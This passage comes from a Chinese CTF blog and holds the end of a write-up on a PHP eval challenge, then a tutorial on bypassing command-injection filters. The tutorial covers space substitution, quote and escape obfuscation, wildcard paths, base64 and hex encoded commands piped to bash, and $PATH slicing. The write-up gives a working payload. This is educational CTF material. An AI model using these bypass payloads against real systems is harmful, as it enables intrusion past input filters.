class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123; [<span class="hljs-string">&quot;e_v.a.l&quot;</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">12</span>) <span class="hljs-string">&quot;&#x27;hellowold!&#x27;&quot;</span> &#125;<br>hello<br></code></pre></td></tr></table></figure><p>成功绕过。</p><p>接下来就是怎么绕正则匹配过滤了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|ls/i&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>); <br></code></pre></td></tr></table></figure><p>过滤了flag,那猜测flag是藏在&#x2F;flag底下的，直接使用通配符：<code>/fl*</code>即可。过滤了<code>system</code>可以使用<code>(sy.(st).em)</code>绕过(字符串拼接)。过滤了<code>cat</code>那就用<code>tac</code>。这道题过滤地并不怎么严格。</p><p>payload:</p><p>password&#x3D;114514&amp;e[v.a.l&#x3D;(sy.(st).em)(<code>printf &quot;\154\163&quot;</code>);  注意printf前和163“后各有一个反引号。</p><p>这里关于绕过的一些知识在之前写的博客里说了些，就不详细写了(比较懒，哈哈)。</p><p>非法参数名传参的问题参考了这位师傅的文章，感谢！</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span>?spm=<span class="hljs-number">1001.2014</span>.<span class="hljs-number">3001.5506</span><br></code></pre></td></tr></table></figure><h2 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h2><p>题目描述：简简单单、随心所欲</p><p><img src="/img/a20.png" alt="a20"></p><p>感觉又是最讨厌的SQL注入。。。</p><p>先看看源码里有没有啥东西，主要看看他这个用户名密码是怎么限制的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">value, type</span>) &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;un&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">3</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">10</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;用户名长度必须为3-10个字符&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;用户名格式错误&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;pw&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (value.<span class="hljs-property">length</span> &lt; <span class="hljs-number">6</span> || value.<span class="hljs-property">length</span> &gt; <span class="hljs-number">18</span>) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;密码长度必须为6-18个字符&#x27;</span><br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^[a-zA-Z0-9!@#$%^&amp;_-]+$/</span>.<span class="hljs-title function_">test</span>(value)) &#123;<br>                    <span class="hljs-keyword">return</span> &#123;<br>                        <span class="hljs-attr">status</span>: <span class="hljs-literal">false</span>,<br>                        <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;密码格式错误&#x27;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> &#123;<br>                <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span><br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>先注册一下：</p><p><img src="/img/a21.png" alt="a21"></p><p>但提示admin已经被注册过了？弱口令试了挺多但没啥用，登不上去。那就随便注册一个：</p><p><img src="/img/a22.png" alt="a22"></p><p>登录后发现跳转到这么个界面:这玩意儿跟个复读机似的，你打啥东西他就把<code>你</code>和<code>您</code>换成<code>我</code>。<code>吗</code>给换成空格，<code>?</code>换成<code>!</code>。而且这东西不用数据包(???)，burpsuite抓包根本没用。。</p><p>它跳转的时候想到了302重定向的问题，就一直开着burpsuite排查，发现这么个东西：</p><p><img src="/img/a23.png" alt="a23"></p><p>结果那个bv是这么个东西：</p><p><img src="/img/a24.png" alt="a24"></p><p>看这标题我就感觉不对劲了，翻简介的时候根本没有第七行。。(#$$#$%^$#@#$%$#@@#$%^&amp;)。</p><p>如果是SQL注入的话，不知道注入点在哪里。试了挺多弱口令也没试出来。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;e_v.a.l&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;hello&quot;</span>;<br>&#125; <br><span class="hljs-meta">?&gt;</span><br>   <br><span class="hljs-comment">//e[v.a.l=11</span><br></code></pre></td></tr></table></figure><p>感谢mochu师傅的文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/mochu7777777/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">115050295</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE中一些常见的绕过方法</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5DRCE%E4%B8%AD%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>入门级理解，没啥含金量:)</p><span id="more"></span><p><strong>命令执行漏洞前提条件：</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">1.存在可调用执行系统命令的函数。<br>2.该函数参数可控。<br>3.对参数过滤不严格。<br></code></pre></td></tr></table></figure><p><strong>一些常见可以执行命令的函数：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-number">1</span>.<span class="hljs-keyword">eval</span>()<span class="hljs-comment">//把一串字符串作为PHP代码执行</span><br><span class="hljs-number">2</span>.<span class="hljs-title function_ invoke__">system</span>()/<span class="hljs-title function_ invoke__">passthru</span>()/<span class="hljs-title function_ invoke__">exec</span>()<br><span class="hljs-number">3</span>.<span class="hljs-title function_ invoke__">call_user_func</span>()/<span class="hljs-title function_ invoke__">call_user_func_array</span>() <span class="hljs-comment">//回调函数</span><br><span class="hljs-number">4</span>.<span class="hljs-title function_ invoke__">creat_function</span>()<br><span class="hljs-number">5</span>.shell_exec <span class="hljs-comment">//注意这玩意儿没回显，不过可以通过把它传给某个文件或者echo的方法看执行结果，比如：</span><br>    <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls -l&#x27;</span>); <span class="hljs-comment">// 执行ls -l命令并将输出保存到$output变量中</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>     /?cmd=ls -al / &gt; viper3.txt<br><span class="hljs-number">6</span>.还可以用反引号``和$()执行命令。<br><span class="hljs-number">7</span>.preg_match的/e模式漏洞。<br></code></pre></td></tr></table></figure><p>最后那个&#x2F;e模式好像已经被弃用好久了。。举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/(\d+)/e&#x27;</span>;<br><span class="hljs-variable">$replacement</span> = <span class="hljs-string">&#x27;&quot;$1&quot; + 1&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-string">&#x27;123&#x27;</span>;<br><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$string</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>; <span class="hljs-comment">// 输出124</span><br></code></pre></td></tr></table></figure><p><code>/(\d+)/e</code>模式匹配一个或多个数字，并使用<code>&quot;$1&quot; + 1</code>作为替换字符串。在替换过程中，<code>&quot;$1&quot;</code>被解析为匹配的数字，然后加1。因此，最终的替换结果是123 + 1，即124。</p><p><strong>管道符(Windows)：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|直接执行后面的语句</span><br><span class="hljs-string">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="hljs-meta">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="hljs-meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></code></pre></td></tr></table></figure><p><img src="/img/b2.png" alt="b2"></p><p><img src="/img/b3.png" alt="b3"></p><p><strong>管道符(Linux)：</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">|直接执行后面的语句</span><br><span class="hljs-string">||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="hljs-meta">&amp;前面和后面命令都要执行，无论前面真假</span><br><span class="hljs-meta">&amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br>;       前后命令都要执行，无论前面真假<br></code></pre></td></tr></table></figure><p><strong>空格绕过(ls &#x2F;和cat等均需空格)：</strong></p><p>1.${IFS}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$&#123;IFS&#125;/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>2.$IFS$9</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ls$IFS$9/<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>3.%09</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs PHP"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>payload:<code>/?cmd=system(&#39;ls%09/&#39;);</code></p><p><img src="/img/b4.png" alt="b4"></p><p>4.&lt;和&lt;&gt;重定向符号</p><p>在Linux中，<code>&lt;</code>是用于重定向输入的符号，它将一个文件的内容作为命令的输入。<code>&lt;</code>符号后面跟着文件名，表示将该文件的内容作为命令的输入。</p><p>例如，假设有一个名为input.txt的文件，包含了一些文本内容。可以使用<code>&lt;</code>符号将input.txt文件的内容作为命令的输入，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &lt; input.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将input.txt文件的内容作为command命令的输入。</p><p>另外，<code>&gt;</code>符号用于重定向输出，它将命令的输出保存到一个文件中。如果文件不存在，则会创建该文件；如果文件已存在，则会覆盖原有内容。</p><p>而<code>&gt;&gt;</code>符号则用于追加输出，它将命令的输出追加到一个文件的末尾，而不是覆盖原有内容。</p><p>例如，假设有一个名为output.txt的文件，可以使用<code>&gt;</code>符号将命令的输出保存到output.txt文件中，如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">command &gt; output.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将其输出保存到output.txt文件中。</p><p>而使用<code>&gt;&gt;</code>符号可以将命令的输出追加到output.txt文件的末尾，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">command</span> &gt;&gt; output.txt<br></code></pre></td></tr></table></figure><p>上述命令将会执行command命令，并将其输出追加到output.txt文件的末尾。</p><p>总结起来，<code>&lt;</code>用于重定向输入，<code>&gt;</code>用于重定向输出，<code>&gt;&gt;</code>用于追加输出。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat&lt;hello.txt<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ cat&lt;&gt;hello.txt<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>注意这东西没法和ls配合使用。</p><p>5.利用{}</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ &#123;cat,hello.txt&#125;<br>hello world!<br>yes<br>no<br>why<br>[viper3@localhost ~]$ &#123;ls,/&#125;<br>bin   dev  home  lib64mnt  proc  run srv  tmp  var<br>boot  etc  lib mediaopt  root  sbin  sys  usr<br></code></pre></td></tr></table></figure><p>大括号（{}）在这个命令中被用作命令行扩展。它会将大括号中的内容展开为多个参数，然后将这些参数传递给命令进行处理。</p><p>6.SQL语句中可以利用&#x2F;**&#x2F;和()包裹字符串代替空格(这个就不算RCE里的绕过了，哈哈)</p><p><strong>过滤关键字，比如cat,tac,ls之类的</strong></p><p>替代：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br></code></pre></td></tr></table></figure><p>利用某些转义符号：</p><p><code>&#39;&#39;,&quot;&quot;,\,$&#123;Z&#125;,$*,$@,$任意，$&#123;任意&#125;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ l&#x27;&#x27;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l&quot;&quot;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$&#123;Z&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l/s<br>bash: l/s: 没有那个文件或目录<br>[viper3@localhost ~]$ l\s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$*s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$@s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$9s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$&#123;k&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br></code></pre></td></tr></table></figure><p>拼接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ a=hel;b=lo.txt;cat $a$b<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>使用反引号&#96;&#96;或$()绕过(比如和printf配合使用)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ printf &quot;\154\163&quot;<br>ls<br>[viper3@localhost ~]$ `printf &quot;\154\163&quot;`<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ (printf &quot;\154\163&quot;)<br>ls[viper3@localhost ~]$ $(printf &quot;\154\163&quot;)<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br></code></pre></td></tr></table></figure><p>printf “??????”这东西是输出???代表的ASCII码值，???代表八进制(也可以用\x??十六进制)，$()这个符号是把括号里面的东西当命令执行,反引号同理。</p><p>通配符</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">在Linux中，通配符是用来匹配文件名或路径的特殊字符。它们可以用于命令行中的文件搜索、文件操作和正则表达式等场景中。<br><br>以下是常用的通配符：<br><br>    *：匹配任意字符（包括空字符）的任意数量。<br>    ?：匹配单个任意字符。<br>    <span class="hljs-selector-attr">[]</span>：匹配方括号内的任意一个字符。<br>    <span class="hljs-selector-attr">[!]</span> 或 <span class="hljs-selector-attr">[^]</span>：匹配不在方括号内的任意一个字符。<br>    &#123;&#125;：用于指定多个选择项，以逗号分隔。<br>    ~：表示当前用户的主目录。<br><br>举例来说，如果你想匹配所有以 <span class="hljs-selector-class">.txt</span> 结尾的文件，可以使用通配符 *<span class="hljs-selector-class">.txt</span>；如果你想匹配以 <span class="hljs-selector-tag">a</span> 开头的三个字符的文件，可以使用通配符 <span class="hljs-selector-tag">a</span>??。<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat he*<br>hello world!<br>yes<br>no<br>why<br>tom<br>jerry<br>chris<br>jack<br>[viper3@localhost ~]$ cat ?????.txt<br>hello world!<br>yes<br>no<br>why<br>*匹配任意数量，这东西可以和find查找命令结合起来:<br>find / -name &quot;fl*&quot;   /是根目录，搜索根目录下所有名字带fl的文件(fl开头，后面任意)<br>注意：这里的?和*都只能用于文件名，如果是命令(类似ls cat等)就不适用。<br>但是：<br>m0re师傅的文章里在开头加了个/???就可以把/?用于命令了：<br><br>zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?at flag<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?at ????<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br></code></pre></td></tr></table></figure><p><strong>编码绕过(应该把前面那个printf的放在这里的，可惜)：</strong></p><p>base64:(这东西可以和前面的&#96;&#96;和$()配合使用)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d<br>cat hello.txt<br>[viper3@localhost ~]$ `echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d`<br>hello world!<br>yes<br>no<br>why<br><br>Y2F0IGhlbGxvLnR4dA== 是cat hello.txt的base64<br></code></pre></td></tr></table></figure><p>hex:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag<br><br>同上，仍能用``及$()替换最后管道符及bash<br></code></pre></td></tr></table></figure><p>换行绕过(感觉这个没怎么用过)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ca\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">t \</span><br><span class="language-bash">&gt; hello\</span><br><span class="language-bash">&gt; .txt</span><br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>\表示换行，下一行是这行的延续。</p><p>m0re师傅的文章中还有这么个东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ca\\&quot;</span>&gt;shell   两个\是为了转义后面的\，以便将其作为普通字符写入文件。</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> shell</span><br>ca\<br>t\<br> fl\<br>ag<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh shell</span>  <br>you are good!<br><br>sh shell是运行名为&quot;shell&quot;的脚本文件的意思。在Linux中，使用sh命令后跟脚本文件的名称可以运行该脚本。<br></code></pre></td></tr></table></figure><p><strong>利用$PATH环境变量绕过：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo $PATH<br>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/viper3/.local/bin:/home/viper3/bin<br>[viper3@localhost ~]$ echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;<br>ls<br>[viper3@localhost ~]$ `echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>crontab    